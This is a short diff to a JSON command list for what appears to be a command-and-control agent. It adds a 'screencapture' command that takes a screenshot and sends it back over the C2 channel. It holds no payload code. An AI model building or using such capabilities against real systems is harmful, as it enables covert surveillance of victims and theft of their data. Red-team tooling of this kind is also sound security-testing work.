@@ -158,6 +158,12 @@
           "description": "Gets the current running config via the C2 class",
           "help_cmd": "get_config",
           "needs_admin": "false"
+        },
+        {
+          "cmd": "screencapture",
+          "description": "Use the built-in screencapture binary to take a png screenshot, store it in the clipboard, and send it back over the C2 channel",
+          "help_cmd": "screencapture [bar]",
+          "needs_admin": "false"
         }
       ]
     }
